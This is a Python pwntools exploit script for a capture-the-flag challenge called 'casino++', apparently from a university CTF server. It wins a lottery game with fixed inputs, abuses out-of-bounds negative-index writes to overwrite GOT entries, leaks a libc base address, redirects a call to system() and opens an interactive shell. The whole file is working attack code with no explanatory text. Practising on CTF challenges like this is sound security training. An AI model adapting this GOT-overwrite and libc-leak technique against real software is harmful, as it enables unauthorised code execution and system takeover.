from pwn import *

context(arch='amd64')

#r = process('./casino++')
#pause()
l = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

host = 'edu-ctf.csie.org'
port = 10176

r = remote(host, port)

def skip_lottery():
    r.sendafter(': ', b'22')
    r.sendafter(': ', b'22')
    r.sendafter(': ', b'22')
    r.sendafter(': ', b'22')
    r.sendafter(': ', b'22')
    r.sendafter(': ', b'23')

def win_lottery():
    r.sendlineafter(': ', b'61')
    r.sendlineafter(': ', b'68')
    r.sendlineafter(': ', b'32')
    r.sendlineafter(': ', b'22')
    r.sendlineafter(': ', b'69')
    r.sendlineafter(': ', b'20')

def change_number(index, after):
    r.sendlineafter(': ', b'1')
    r.sendafter(': ', str(index).encode())
    r.sendafter(': ', str(after).encode())


pop_rdi = 0x0000000000400c23
libc_start_main = 0x0000000000601ff0
puts_plt = 0x00000000004006e0
casino_plt = 0x000000000040095d
printf_plt = 0x0000000000400700

sh = b'\x00' * 0x10 + p64(libc_start_main)
r.sendlineafter(': ', sh)
r.sendafter(': ', b'22')

skip_lottery()

r.sendlineafter(': ', b'1')
r.sendafter(': ', b'-42')
r.sendlineafter(': ', b'0')

win_lottery()

r.sendlineafter(': ', b'1')
r.sendafter(': ', b'-43')
r.sendlineafter(': ', str(casino_plt).encode())

skip_lottery()

r.sendlineafter(': ', b'1')
r.sendafter(': ', b'-34')
r.sendlineafter(': ', b'0')

win_lottery()

r.sendlineafter(': ', b'1')
r.sendafter(': ', b'-35')
r.sendlineafter(': ', str(printf_plt).encode())
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x0000000000021ab0
print('base: %s' %hex(libc_base))
print('system address: %s' %hex(libc_base + 0x000000000004f440))
overlap_hex = hex(libc_base + 0x000000000004f440)[-8:]
overlap_int = int(overlap_hex, 16)
print('hex:', overlap_hex, 'int: ', overlap_int)

skip_lottery()

r.sendlineafter(': ', b'1')
r.sendafter(': ', b'-29')
r.sendlineafter(': ', str(overlap_int).encode())

r.interactive()

